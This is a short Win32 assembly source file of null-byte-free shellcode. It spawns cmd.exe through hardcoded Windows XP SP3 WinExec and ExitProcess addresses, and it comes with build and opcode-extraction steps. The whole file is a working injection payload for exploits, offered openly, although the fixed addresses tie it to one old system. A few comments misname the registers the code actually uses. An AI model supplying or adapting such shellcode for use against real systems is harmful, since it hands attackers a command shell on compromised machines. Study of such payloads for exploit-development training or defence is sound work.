;-------------------------------------------------------------------------------------------------------------------------------;
; 1) This shellcode will spawn a cmd.exe
; 2) Null-bytes free
; 3) This shellcode was developed using a Windows XP SP3 kernel32.dll Winexec address, so it won't work on a different system
;-------------------------------------------------------------------------------------------------------------------------------;

;------------------------;
; Author: lem0nSec_
; Date: 30/04/2022
; Lang: win32 Assembly
;------------------------;

;-----------------------------------------------------------------------------------;
; compile to object with --> nasm win32_cmd_shellcode.asm -o cmd.bin
; extract opcodes using bin2sc.py (https://gist.github.com/superkojiman/11164279)
;-----------------------------------------------------------------------------------;

[BITS 32]

global _start

	xor ebx, ebx
	push ebx			; zeroing out ebx and pushing it
	push 0x6578652e			; pushing exe.
	xor ecx, ecx
	mov ecx, 0x01656e64
	sub ecx, 0x01010101
	push ecx			; pushing cmd --> null-byte-free 'dmc' obtained with some arithmetic ops in edx
	mov edx, esp			; storing addr of cmd.exe into edx and pushing it
	push 1				; pushing command line arg 2
	push edx
	mov eax, 0x7C8623AD
	call eax			; storing Winexec func (kernel32.dll) into ebx, then calling it
	xor ebx, ebx
	push ebx			; pushing 0 onto the stack as ExitProcess (kernel32.dll) arg
	mov eax, 0x7C81CAFA
	jmp eax				; storing ExitProcess into eax and jumping to it
